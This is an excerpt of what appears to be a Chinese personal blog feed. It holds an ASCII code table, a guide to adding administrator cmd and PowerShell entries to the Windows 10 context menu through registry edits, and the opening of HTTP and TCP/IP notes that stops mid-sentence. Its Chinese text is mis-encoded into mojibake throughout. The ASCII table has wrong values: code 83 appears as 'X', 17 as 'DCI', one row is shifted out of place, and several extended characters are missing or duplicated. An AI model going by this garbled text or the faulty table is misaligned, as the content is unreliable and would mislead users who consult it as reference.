        <content type="html"><![CDATA[<h1 id="ASCIIç è¡¨"><a href="#ASCIIç è¡¨" class="headerlink" title="ASCIIç è¡¨"></a>ASCIIç è¡¨</h1><table><thead><tr><th><strong>ASCIIå€¼</strong></th><th><strong>æ§åˆ¶å­—ç¬¦</strong></th><th><strong>ASCIIå€¼</strong></th><th><strong>æ§åˆ¶å­—ç¬¦</strong></th><th><strong>ASCIIå€¼</strong></th><th><strong>æ§åˆ¶å­—ç¬¦</strong></th><th><strong>ASCIIå€¼</strong></th><th><strong>æ§åˆ¶å­—ç¬¦</strong></th></tr></thead><tbody><tr><td>0</td><td>NUL</td><td>32</td><td>(space)</td><td>64</td><td>@</td><td>96</td><td>ã€</td></tr><tr><td>1</td><td>SOH</td><td>33</td><td>ï¼</td><td>65</td><td>A</td><td>97</td><td>a</td></tr><tr><td>2</td><td>STX</td><td>34</td><td>â€</td><td>66</td><td>B</td><td>98</td><td>b</td></tr><tr><td>3</td><td>ETX</td><td>35</td><td>#</td><td>67</td><td>C</td><td>99</td><td>c</td></tr><tr><td>4</td><td>EOT</td><td>36</td><td>$</td><td>68</td><td>D</td><td>100</td><td>d</td></tr><tr><td>5</td><td>ENQ</td><td>37</td><td>%</td><td>69</td><td>E</td><td>101</td><td>e</td></tr><tr><td>6</td><td>ACK</td><td>38</td><td>&amp;</td><td>70</td><td>F</td><td>102</td><td>f</td></tr><tr><td>7</td><td>BEL</td><td>39</td><td>â€˜</td><td>71</td><td>G</td><td>103</td><td>g</td></tr><tr><td>8</td><td>BS</td><td>40</td><td>(</td><td>72</td><td>H</td><td>104</td><td>h</td></tr><tr><td>9</td><td>HT</td><td>41</td><td>)</td><td>73</td><td>I</td><td>105</td><td>i</td></tr><tr><td>10</td><td>LF</td><td>42</td><td>*</td><td>74</td><td>J</td><td>106</td><td>j</td></tr><tr><td>11</td><td>VT</td><td>43</td><td>+</td><td>75</td><td>K</td><td>107</td><td>k</td></tr><tr><td>12</td><td>FF</td><td>44</td><td>,</td><td>76</td><td>L</td><td>108</td><td>l</td></tr><tr><td>13</td><td>CR</td><td>45</td><td>-</td><td>77</td><td>M</td><td>109</td><td>m</td></tr><tr><td>14</td><td>SO</td><td>46</td><td>.</td><td>78</td><td>N</td><td>110</td><td>n</td></tr><tr><td>15</td><td>SI</td><td>47</td><td>/</td><td>79</td><td>O</td><td>111</td><td>o</td></tr><tr><td>16</td><td>DLE</td><td>48</td><td>0</td><td>80</td><td>P</td><td>112</td><td>p</td></tr><tr><td>17</td><td>DCI</td><td>49</td><td>1</td><td>81</td><td>Q</td><td>113</td><td>q</td></tr><tr><td>18</td><td>DC2</td><td>50</td><td>2</td><td>82</td><td>R</td><td>114</td><td>r</td></tr><tr><td>19</td><td>DC3</td><td>51</td><td>3</td><td>83</td><td>X</td><td>115</td><td>s</td></tr><tr><td>20</td><td>DC4</td><td>52</td><td>4</td><td>84</td><td>T</td><td>116</td><td>t</td></tr><tr><td>21</td><td>NAK</td><td>53</td><td>5</td><td>85</td><td>U</td><td>117</td><td>u</td></tr><tr><td>22</td><td>SYN</td><td>54</td><td>6</td><td>86</td><td>V</td><td>118</td><td>v</td></tr><tr><td>23</td><td>TB</td><td>55</td><td>7</td><td>87</td><td>W</td><td>119</td><td>w</td></tr><tr><td>24</td><td>CAN</td><td>56</td><td>8</td><td>88</td><td>X</td><td>120</td><td>x</td></tr><tr><td>25</td><td>EM</td><td>57</td><td>9</td><td>89</td><td>Y</td><td>121</td><td>y</td></tr><tr><td>26</td><td>SUB</td><td>58</td><td>:</td><td>90</td><td>Z</td><td>122</td><td>z</td></tr><tr><td>27</td><td>ESC</td><td>59</td><td>;</td><td>91</td><td>[</td><td>123</td><td>{</td></tr><tr><td>28</td><td>FS</td><td>60</td><td>&lt;</td><td>92</td><td>\</td><td>124</td><td>|</td></tr><tr><td>29</td><td>GS</td><td>61</td><td>=</td><td>93</td><td>]</td><td>125</td><td>}</td></tr><tr><td>30</td><td>RS</td><td>62</td><td>&gt;</td><td>94</td><td>^</td><td>126</td><td>~</td></tr><tr><td>31</td><td>US</td><td>63</td><td>?</td><td>95</td><td>â€”</td><td>127</td><td>DEL</td></tr></tbody></table><h2 id="ASCIIè¯ é‡Šéƒ¨åˆ†"><a href="#ASCIIè¯ é‡Šéƒ¨åˆ†" class="headerlink" title="ASCIIè¯ é‡Šéƒ¨åˆ†"></a>ASCIIè¯ é‡Šéƒ¨åˆ†</h2><table><thead><tr><th><strong>åè¿›åˆ¶</strong></th><th><strong>åå…­è¿›åˆ¶</strong></th><th><strong>å­—ç¬¦</strong></th><th><strong>åè¿›åˆ¶</strong></th><th><strong>åå…­è¿›åˆ¶</strong></th><th><strong>å­—ç¬¦</strong></th></tr></thead><tbody><tr><td>0</td><td>00</td><td>ç©º</td><td>16</td><td>10</td><td>æ•°æ®é“¾è·¯è½¬æ„</td></tr><tr><td>1</td><td>01</td><td>å¤´æ ‡å¼€å§‹</td><td>17</td><td>11</td><td>è®¾å¤‡æ§åˆ¶ 1</td></tr><tr><td>2</td><td>02</td><td>æ­£æ–‡å¼€å§‹</td><td>18</td><td>12</td><td>è®¾å¤‡æ§åˆ¶ 2</td></tr><tr><td>3</td><td>03</td><td>æ­£æ–‡ç»“æŸ</td><td>19</td><td>13</td><td>è®¾å¤‡æ§åˆ¶ 3</td></tr><tr><td>4</td><td>04</td><td>ä¼ è¾“ç»“æŸ</td><td>20</td><td>14</td><td>è®¾å¤‡æ§åˆ¶ 4</td></tr><tr><td>5</td><td>05</td><td>æŸ¥è¯¢</td><td>21</td><td>15</td><td>åç¡®è®¤</td></tr><tr><td>6</td><td>06</td><td>ç¡®è®¤</td><td>22</td><td>16</td><td>åŒæ­¥ç©ºé—²</td></tr><tr><td>7</td><td>07</td><td>éœ‡é“ƒ</td><td>23</td><td>17</td><td>ä¼ è¾“å—ç»“æŸ</td></tr><tr><td>8</td><td>08</td><td>backspace</td><td>24</td><td>18</td><td>å–æ¶ˆ</td></tr><tr><td>9</td><td>09</td><td>æ°´å¹³åˆ¶è¡¨ç¬¦</td><td>25</td><td>19</td><td>åª’ä½“ç»“æŸ</td></tr><tr><td>10</td><td>0A</td><td>æ¢è¡Œ/æ–°è¡Œ</td><td>26</td><td>1A</td><td>æ›¿æ¢</td></tr><tr><td>11</td><td>0B</td><td>ç«–ç›´åˆ¶è¡¨ç¬¦</td><td>27</td><td>1B</td><td>è½¬æ„</td></tr><tr><td>12</td><td>0C</td><td>æ¢é¡µ/æ–°é¡µ</td><td>28</td><td>1C</td><td>æ–‡ä»¶åˆ†éš”ç¬¦</td></tr><tr><td>13</td><td>0D</td><td>å›è½¦</td><td>29</td><td>1D</td><td>ç»„åˆ†éš”ç¬¦</td></tr><tr><td>14</td><td>0E</td><td>ç§»å‡º</td><td>30</td><td>1E</td><td>è®°å½•åˆ†éš”ç¬¦</td></tr><tr><td>15</td><td>0F</td><td>ç§»å…¥</td><td>31</td><td>1F</td><td>å•å…ƒåˆ†éš”ç¬¦</td></tr></tbody></table><h2 id="ASCIIæ‰©å±•å­—ç¬¦"><a href="#ASCIIæ‰©å±•å­—ç¬¦" class="headerlink" title="ASCIIæ‰©å±•å­—ç¬¦"></a>ASCIIæ‰©å±•å­—ç¬¦</h2><table><thead><tr><th><strong>åè¿›åˆ¶</strong></th><th><strong>åå…­è¿›åˆ¶</strong></th><th><strong>å­—ç¬¦</strong></th><th><strong>åè¿›åˆ¶</strong></th><th><strong>åå…­è¿›åˆ¶</strong></th><th><strong>å­—ç¬¦</strong></th></tr></thead><tbody><tr><td>128</td><td>80</td><td>Ã‡</td><td>192</td><td>C0</td><td>â””</td></tr><tr><td>129</td><td>81</td><td>Ã¼</td><td>193</td><td>C1</td><td>â”´</td></tr><tr><td>130</td><td>82</td><td>Ã©</td><td>194</td><td>C2</td><td>â”¬</td></tr><tr><td>131</td><td>83</td><td>Ã¢</td><td>195</td><td>C3</td><td>â”œ</td></tr><tr><td>132</td><td>84</td><td>Ã¤</td><td>196</td><td>C4</td><td>â”€</td></tr><tr><td>133</td><td>85</td><td>Ã </td><td>197</td><td>C5</td><td>â”¼</td></tr><tr><td>134</td><td>86</td><td>Ã¥</td><td>198</td><td>C6</td><td>â•</td></tr><tr><td>135</td><td>87</td><td>Ã§</td><td>199</td><td>C7</td><td>â•Ÿ</td></tr><tr><td>136</td><td>88</td><td>Ãª</td><td>200</td><td>C8</td><td>â•š</td></tr><tr><td>137</td><td>89</td><td>Ã«</td><td>201</td><td>C9</td><td>â•”</td></tr><tr><td>138</td><td>8A</td><td>Ã¨</td><td>202</td><td>CA</td><td>â•©</td></tr><tr><td>139</td><td>8B</td><td>Ã¯</td><td>203</td><td>CB</td><td>â•¦</td></tr><tr><td>140</td><td>8C</td><td>Ã®</td><td>204</td><td>CC</td><td>â• </td></tr><tr><td>141</td><td>8D</td><td>Ã¬</td><td>205</td><td>CD</td><td>â•</td></tr><tr><td>142</td><td>8E</td><td>Ã„</td><td>206</td><td>CE</td><td>â•¬</td></tr><tr><td>143</td><td>8F</td><td>Ã…</td><td>207</td><td>CF</td><td>â•§</td></tr><tr><td>144</td><td>90</td><td>Ã‰</td><td>208</td><td>D0</td><td>â•¨</td></tr><tr><td>145</td><td>91</td><td>Ã¦</td><td>209</td><td>D1</td><td>â•¤</td></tr><tr><td>146</td><td>92</td><td>Ã†</td><td>210</td><td>D2</td><td>â•¥</td></tr><tr><td>147</td><td>93</td><td>Ã´</td><td>211</td><td>D3</td><td>â•™</td></tr><tr><td>148</td><td>94</td><td>Ã¶</td><td>212</td><td>D4</td><td>Ã”</td></tr><tr><td>149</td><td>95</td><td>Ã²</td><td>213</td><td>D5</td><td>â•’</td></tr><tr><td>150</td><td>96</td><td>Ã»</td><td>214</td><td>D6</td><td>â•“</td></tr><tr><td>151</td><td>97</td><td>Ã¹</td><td>215</td><td>D7</td><td>â•«</td></tr><tr><td>152</td><td>98</td><td>Ã¿</td><td>216</td><td>D8</td><td>â•ª</td></tr><tr><td>153</td><td>99</td><td>Ã–</td><td>217</td><td>D9</td><td>â”˜</td></tr><tr><td>154</td><td>9A</td><td>Ãœ</td><td>218</td><td>DA</td><td>â”Œ</td></tr><tr><td>155</td><td>9B</td><td>Â¢</td><td>219</td><td>DB</td><td>â–ˆ</td></tr><tr><td>156</td><td>9C</td><td>Â£</td><td>220</td><td>DC</td><td>â–„</td></tr><tr><td>157</td><td>9D</td><td>Â¥</td><td>221</td><td>DD</td><td>â–Œ</td></tr><tr><td>158</td><td>9E</td><td>?</td><td>222</td><td>DE</td><td>?</td></tr><tr><td>159</td><td>9F</td><td>Æ’</td><td>223</td><td>DF</td><td>?</td></tr><tr><td>160</td><td>A0</td><td>Ã¡</td><td>224</td><td>E0</td><td>Î±</td></tr><tr><td>161</td><td>A1</td><td>Ã­</td><td>225</td><td>E1</td><td>ÃŸ</td></tr><tr><td>162</td><td>A2</td><td>Ã³</td><td>226</td><td>E2</td><td>Î“</td></tr><tr><td>163</td><td>A3</td><td>Ãº</td><td>227</td><td>E3</td><td>Ï€</td></tr><tr><td>164</td><td>A4</td><td>Ã±</td><td>228</td><td>E4</td><td>Î£</td></tr><tr><td>165</td><td>A5</td><td>Ã‘</td><td>229</td><td>E5</td><td>Ïƒ</td></tr><tr><td>166</td><td>A6</td><td>Âª</td><td>230</td><td>E6</td><td>Âµ</td></tr><tr><td>167</td><td>A7</td><td>Âº</td><td>231</td><td>E7</td><td>Ï„</td></tr><tr><td>168</td><td>A8</td><td>Â¿</td><td>232</td><td>E8</td><td>Î¦</td></tr><tr><td>169</td><td>A9</td><td>?</td><td>233</td><td>E9</td><td>Î˜</td></tr><tr><td>170</td><td>AA</td><td>Â¬</td><td>234</td><td>EA</td><td>Î©</td></tr><tr><td>171</td><td>AB</td><td>Â½</td><td>235</td><td>EB</td><td>Î´</td></tr><tr><td>172</td><td>AC</td><td>Â¼</td><td>236</td><td>EC</td><td>âˆ</td></tr><tr><td>173</td><td>AD</td><td>Â¡</td><td>237</td><td>ED</td><td>Ï†</td></tr><tr><td>174</td><td>AE</td><td>Â«</td><td>238</td><td>EE</td><td>Îµ</td></tr><tr><td>175</td><td>AF</td><td>Â»</td><td>239</td><td>EF</td><td>âˆ©</td></tr><tr><td>176</td><td>B0</td><td>?</td><td>240</td><td>F0</td><td>â‰¡</td></tr><tr><td>177</td><td>B1</td><td>?</td><td>241</td><td>F1</td><td>Â±</td></tr><tr><td>178</td><td>B2</td><td>â–“</td><td>242</td><td>F2</td><td>â‰¥</td></tr><tr><td>179</td><td>B3</td><td>â”‚</td><td>243</td><td>F3</td><td>â‰¤</td></tr><tr><td>180</td><td>B4</td><td>â”¤</td><td>244</td><td>F4</td><td>?</td></tr><tr><td>181</td><td>B5</td><td>â•¡</td><td>245</td><td>F5</td><td>?</td></tr><tr><td>182</td><td>B6</td><td>â•¢</td><td>246</td><td>F6</td><td>Ã·</td></tr><tr><td>183</td><td>B7</td><td>â•–</td><td>247</td><td>F7</td><td>â‰ˆ</td></tr><tr><td>184</td><td>B8</td><td>â••</td><td>248</td><td>F8</td><td>â‰ˆ</td></tr><tr><td>185</td><td>B9</td><td>â•£</td><td>249</td><td>F9</td><td>?</td></tr><tr><td>186</td><td>BA</td><td>â•‘</td><td>250</td><td>FA</td><td>Â·</td></tr><tr><td>187</td><td>BB</td><td>â•—</td><td>251</td><td>FB</td><td>âˆš</td></tr><tr><td>188</td><td>BC</td><td>â•</td><td>252</td><td>FC</td><td>?</td></tr><tr><td>189</td><td>BD</td><td>â•œ</td><td>253</td><td>FD</td><td>Â²</td></tr><tr><td>190</td><td>BE</td><td>â•›</td><td>FE</td><td>â– </td><td></td></tr><tr><td>191</td><td>BF</td><td>â”</td><td>255</td><td>FF</td><td>Ã¿</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10å³é”®æ·»åŠ cmdå’Œpowershell</title>
      <link href="/2021/05/16/win10-you-jian-tian-jia-cmd/"/>
      <url>/2021/05/16/win10-you-jian-tian-jia-cmd/</url>
      
        <content type="html"><![CDATA[<h1 id="win10å³é”®æ·»åŠ cmdå’Œpowershell"><a href="#win10å³é”®æ·»åŠ cmdå’Œpowershell" class="headerlink" title="win10å³é”®æ·»åŠ cmdå’Œpowershell"></a>win10å³é”®æ·»åŠ cmdå’Œpowershell</h1><h2 id="åœ¨ç©ºç™½å¤„å³å‡»"><a href="#åœ¨ç©ºç™½å¤„å³å‡»" class="headerlink" title="åœ¨ç©ºç™½å¤„å³å‡»"></a>åœ¨ç©ºç™½å¤„å³å‡»</h2><p>ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ”¹åŸç”Ÿçš„æ³¨å†Œè¡¨ï¼Œä¸€ç§æ·»åŠ æ–°çš„æ³¨å†Œè¡¨</p><h3 id="1-æ”¹åŸç”Ÿçš„æ³¨å†Œè¡¨"><a href="#1-æ”¹åŸç”Ÿçš„æ³¨å†Œè¡¨" class="headerlink" title="1. æ”¹åŸç”Ÿçš„æ³¨å†Œè¡¨"></a>1. æ”¹åŸç”Ÿçš„æ³¨å†Œè¡¨</h3><p><code>win+r</code>è¾“å…¥<code>register</code>æ‰“å¼€æ³¨å†Œè¡¨</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVHG8.png" alt="gcVHG8.png"></p><ul><li><p>cmd</p><p>æ‰¾åˆ°<code>è®¡ç®—æœº\HKEY_CLASSES_ROOT\Directory\Background\shell\cmd</code></p><p>å°†<code>HideBasedOnVelocityId</code>æ”¹ä¸º<code>ShowBasedOnVelocityId</code></p></li><li><p>powershell</p><p>æ‰¾åˆ°<code>è®¡ç®—æœº\HKEY_CLASSES_ROOT\Directory\Background\shell\Powershell</code></p><p>å°†<code>HideBasedOnVelocityId</code>æ”¹ä¸º<code>ShowBasedOnVelocityId</code></p></li></ul><p>å› ä¸º<code>Extended</code>è¿™ä¸ªäºŒè¿›åˆ¶å€¼å­˜åœ¨ï¼Œéœ€è¦shift+å³é”®æ‰èƒ½æ˜¾ç¤ºï¼Œè¦ä½¿ç”¨å³é”®ç›´æ¥æ˜¾ç¤ºï¼Œå¯ä»¥å°†è¿™ä¸ªäºŒè¿›åˆ¶å€¼åˆ é™¤</p><p>è¿™ä¸ªæ—¶å€™å¯èƒ½ä¼šå› ä¸ºæƒé™åŸå› ä¿®æ”¹å¤±è´¥ï¼ŒæŸ¥çœ‹ä¸‹æ–‡è§£å†³æ–¹æ³•</p><h3 id="2-æ·»åŠ æ–°çš„æ³¨å†Œè¡¨"><a href="#2-æ·»åŠ æ–°çš„æ³¨å†Œè¡¨" class="headerlink" title="2.æ·»åŠ æ–°çš„æ³¨å†Œè¡¨"></a>2.æ·»åŠ æ–°çš„æ³¨å†Œè¡¨</h3><p>åˆ›å»ºå¦‚å›¾å‡ ä¸ªé¡¹</p><p><img src="https://z3.ax1x.com/2021/05/16/gcZCGT.png" alt="gcZCGT.png"></p><p>è¿™é‡Œç›´æ¥æ¼”ç¤ºæ·»åŠ ä»¥ç®¡ç†å‘˜æ‰“å¼€ï¼Œéç®¡ç†å‘˜æ‰“å¼€åªéœ€è¦åšä¸€äº›æ”¹åŠ¨</p><ul><li><p>powershell</p><p>åœ¨powershellaä¸‹è¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><p>æ–°å»ºå­—ç¬¦ä¸²å€¼<code>Extended</code> å€¼ä¸ºç©º</p><p>æ–°å»ºå­—ç¬¦ä¸²å€¼<code>MUIVerb</code>å€¼ä¸º<code>åœ¨æ­¤å¤„ä»¥ç®¡ç†å‘˜æ‰“å¼€powershellçª—å£</code></p><p>æ–°å»ºå­—ç¬¦ä¸²å€¼<code>NoWorkingDirectory</code>å€¼ä¸ºç©º</p><p>æ–°å»ºDWORDå€¼<code>ShowBasedOnVelocityId</code>å€¼ä¸º<code>639bc8</code></p><p><img src="https://z3.ax1x.com/2021/05/16/gcZEL9.png" alt="gcZEL9.png"></p><p>å¯¹commandå†™å…¥æ•°æ®</p><p><img src="https://z3.ax1x.com/2021/05/16/gcZ9iV.png" alt="gcZ9iV.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell.exe <span class="token parameter variable">-command</span> Start-Process powershell <span class="token parameter variable">-ArgumentList</span> <span class="token punctuation">\</span>"-noexit<span class="token punctuation">\</span>",<span class="token punctuation">\</span>"Set-Location <span class="token parameter variable">-literalPath</span> <span class="token string">'%V'</span><span class="token punctuation">\</span>" <span class="token parameter variable">-Verb</span> runAspowershell.exe <span class="token parameter variable">-command</span> Start-Process powershellå¼€å§‹è¿è¡Œpowershell<span class="token parameter variable">-ArgumentList</span> <span class="token punctuation">\</span>"-noexit<span class="token punctuation">\</span>",<span class="token punctuation">\</span>"Set-Location <span class="token parameter variable">-literalPath</span> <span class="token string">'%V'</span><span class="token punctuation">\</span>"é€‰é¡¹ noexitä¸é€€å‡º  Set-Location <span class="token parameter variable">-literalPath</span> <span class="token string">'%V'</span>å®šä½<span class="token parameter variable">-Verb</span> runAs ä»¥ç®¡ç†å‘˜è¿è¡Œcmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>cmd</p><p>å¿…é¡»æ˜¯<code>runas</code>åå­—ä¸èƒ½æ”¹ï¼Œåœ¨ä¸‹é¢æ–°å»ºDWORDå€¼<code>ShowBasedOnVelocityId</code>å€¼ä¸º<code>639bc8</code></p><p>å¯¹commandå†™å…¥æ•°æ®</p><p><img src="https://z3.ax1x.com/2021/05/16/gcZZZR.png" alt="gcZZZR.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd.exe /s /k <span class="token function">pushd</span> <span class="token string">"%V"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœè¦ä»¥æ™®é€šç”¨æˆ·æ‰“å¼€ï¼Œåˆ™å¯ä»¥å°†<code>runas</code>æ¢ä¸ºå…¶ä»–åå­—ï¼Œå†æ·»åŠ </p></li></ul><h2 id="æ–‡ä»¶å¤¹ä¸Šå³å‡»"><a href="#æ–‡ä»¶å¤¹ä¸Šå³å‡»" class="headerlink" title="æ–‡ä»¶å¤¹ä¸Šå³å‡»"></a>æ–‡ä»¶å¤¹ä¸Šå³å‡»</h2><p>æ–¹æ³•å’Œå‰é¢ç›¸ä¼¼</p><p>è½¬åˆ°<code>è®¡ç®—æœº\HKEY_CLASSES_ROOT\Folder\shell\</code>ç›®å½•ä¸‹</p><p>å»ºç«‹é¡¹å¦‚ä¸‹</p><p><img src="https://z3.ax1x.com/2021/05/19/g4nmvR.png" alt="g4nmvR.png"></p><p>ç„¶åæ“ä½œå’Œå‰é¢ç›¸è¯†</p><p>åªéœ€è¦åœ¨ä¸»é¡¹<code>cmd</code>è®¾ç½®å³é”®æ˜¾ç¤ºåå­—ï¼Œæ•°æ®æ”¹ä¸ºä½ æƒ³è®¾ç½®çš„</p><p><code>command</code>ä¸­æ·»åŠ å’Œå‰é¢æåˆ°çš„ä¸€æ ·çš„å€¼</p><p>ç¤ºä¾‹</p><p><img src="https://z3.ax1x.com/2021/05/19/g4nMb6.png" alt="g4nMb6.png"></p><p><img src="https://z3.ax1x.com/2021/05/19/g4nGPe.png" alt="g4nGPe.png"></p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>å³å‡»cmd-&gt;æƒé™</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVbRS.png" alt="gcVbRS.png"></p><p>ç‚¹å‡»å³ä¸‹è§’é«˜çº§</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVqxg.png" alt="gcVqxg.png"></p><p>ç‚¹å‡»å³ä¸Šæ‰€æœ‰è€…æ—çš„æ›´æ”¹</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVxZn.png" alt="gcVxZn.png"></p><p>è¾“å…¥<code>Administrators</code>ç‚¹å‡»æ£€æŸ¥åç§°-&gt;ç¡®å®š</p><p><img src="https://z3.ax1x.com/2021/05/16/gcVzaq.png" alt="gcVzaq.png"></p><p>åŒå‡»<code>Administrators</code></p><p><img src="https://z3.ax1x.com/2021/05/16/gcZSI0.png" alt="gcZSI0.png"></p><p>å‹¾é€‰å®Œå…¨æ§åˆ¶ï¼Œä¸€ç›´ç¡®å®š</p><h2 id="å‚æ•°è§£æ"><a href="#å‚æ•°è§£æ" class="headerlink" title="å‚æ•°è§£æ"></a>å‚æ•°è§£æ</h2><ul><li><p><code>Extended</code></p><p>è®¾ç½®è¯¥å€¼æ—¶ï¼Œéœ€è¦shift+å³é”®æ˜¾ç¤º</p><p>ä¸è®¾ç½®ç›´æ¥å³é”®æ˜¾ç¤º</p></li><li><p><code>MUIVerb</code></p><p>è®¾ç½®çš„å€¼ä¼šæ˜¾ç¤ºåœ¨å³é”®ä¸Š</p><p>ä¸è®¾ç½®æ˜¾ç¤ºæ–‡ä»¶å¤¹å</p></li><li><p><code>NoWorkingDirectory</code></p><p>ä¸çŸ¥é“</p></li><li><p><code>ShowBasedOnVelocityId</code></p><p>å›ºå®šä¸º<code>639bc8</code></p></li></ul><h2 id="ä¸€é”®æ“ä½œ"><a href="#ä¸€é”®æ“ä½œ" class="headerlink" title="ä¸€é”®æ“ä½œ"></a>ä¸€é”®æ“ä½œ</h2><p>å°†ä¸‹é¢ä»£ç ä¿å­˜ä¸ºxxx.regçš„æ³¨å†Œè¡¨æ–‡ä»¶ï¼Œç¼–ç ä¸ºANSIï¼Œç‚¹å‡»è¿è¡Œ</p><p>ä»¥ç®¡ç†å‘˜æ–¹å¼è¿è¡Œpowershell</p><pre class="line-numbers language-reg" data-language="reg"><code class="language-reg">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\powershella]"Extended"="""MUIVerb"="åœ¨æ­¤å¤„ä»¥ç®¡ç†å‘˜æ‰“å¼€powershellçª—å£""ShowBasedOnVelocityId"=dword:00639bc8"NoWorkingDirectory"=""[HKEY_CLASSES_ROOT\Directory\Background\shell\powershella\command]@="powershell.exe -command Start-Process powershell -ArgumentList \\\"-noexit\\\",\\\"Set-Location -literalPath '%V'\\\" -Verb runAs"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ç®¡ç†å‘˜æ–¹å¼è¿è¡Œcmd</p><pre class="line-numbers language-reg" data-language="reg"><code class="language-reg">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\runas]"ShowBasedOnVelocityId"=dword:00639bc8[HKEY_CLASSES_ROOT\Directory\Background\shell\runas\command]@="cmd.exe /s /k pushd \"%V\""<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPå­¦ä¹ </title>
      <link href="/2021/04/23/http-xue-xi/"/>
      <url>/2021/04/23/http-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="webåè®®"><a href="#webåè®®" class="headerlink" title="webåè®®"></a>webåè®®</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>Web ä½¿ç”¨ä¸€ç§åä¸º HTTPï¼ˆHyperText Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®® ï¼‰çš„åè®®ä½œä¸ºè§„èŒƒï¼Œå®Œæˆä»å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯ç­‰ä¸€ç³»åˆ—è¿ä½œæµç¨‹ã€‚</p><p>1997 å¹´  1 æœˆå…¬å¸ƒçš„  HTTP/1.1 æ˜¯ç›®å‰ä¸»æµçš„  HTTP åè®®ç‰ˆæœ¬ã€‚</p><h3 id="TCP-IPåè®®ç°‡"><a href="#TCP-IPåè®®ç°‡" class="headerlink" title="TCP/IPåè®®ç°‡"></a>TCP/IPåè®®ç°‡</h3><p><img src="https://z3.ax1x.com/2021/03/24/6biYzq.png" alt="6biYzq.png"></p><h4 id="TCP-IPåˆ†å±‚"><a href="#TCP-IPåˆ†å±‚" class="headerlink" title="TCP/IPåˆ†å±‚"></a>TCP/IPåˆ†å±‚</h4><h5 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h5><p>FTPï¼ˆFileTransfer Protocolï¼Œæ–‡ä»¶ä¼ è¾“åè®®ï¼‰å’Œ DNSï¼ˆDomain Name Systemï¼ŒåŸŸåç³»ç»Ÿï¼‰</p><p>HTTP</p><h5 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h5><p>TCPï¼ˆTransmission Control Protocolï¼Œä¼ è¾“æ§åˆ¶åè®®ï¼‰å’Œ UDPï¼ˆUser Data Protocolï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰</p><h5 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h5><p>ç½‘ç»œå±‚æ‰€èµ·çš„ä½œç”¨å°±æ˜¯åœ¨ä¼—å¤šçš„é€‰é¡¹å†…é€‰æ‹©ä¸€æ¡ä¼ è¾“è·¯çº¿</p><h5 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h5><p>ç”¨æ¥å¤„ç†è¿æ¥ç½‘ç»œçš„ç¡¬ä»¶éƒ¨åˆ†</p><h4 id="TCP-IP-é€šä¿¡ä¼ è¾“æµ"><a href="#TCP-IP-é€šä¿¡ä¼ è¾“æµ" class="headerlink" title="TCP/IP é€šä¿¡ä¼ è¾“æµ"></a>TCP/IP é€šä¿¡ä¼ è¾“æµ</h4><p><img src="https://z3.ax1x.com/2021/03/24/6bi0wF.png" alt="6bi0wF.png"></p><h3 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h3><p>ä¸åŒçš„ç¡¬ä»¶ã€æ“ä½œç³»ç»Ÿä¹‹é—´çš„é€šä¿¡ï¼Œæ‰€æœ‰çš„è¿™ä¸€åˆ‡éƒ½éœ€è¦ä¸€ç§è§„åˆ™ã€‚è€Œæˆ‘ä»¬å°±æŠŠè¿™ç§è§„åˆ™ç§°ä¸ºåè®®ï¼ˆprotocolï¼‰ã€‚</p><h3 id="IPåè®®"><a href="#IPåè®®" class="headerlink" title="IPåè®®"></a>IPåè®®</h3><p>IPï¼ˆInternet Protocolï¼‰ç½‘é™…åè®®ä½äºç½‘ç»œå±‚</p><p>IP åè®®çš„ä½œç”¨æ˜¯æŠŠå„ç§æ•°æ®åŒ…ä¼ é€ç»™å¯¹æ–¹ã€‚</p><p>P åœ°å€æŒ‡æ˜äº†èŠ‚ç‚¹è¢«åˆ†é…åˆ°çš„åœ°å€ï¼ŒMAC åœ°å€æ˜¯æŒ‡ç½‘å¡æ‰€å±çš„å›ºå®šåœ°å€ã€‚IP åœ°å€å¯ä»¥å’Œ MAC åœ°å€è¿›è¡Œé…å¯¹ã€‚IP 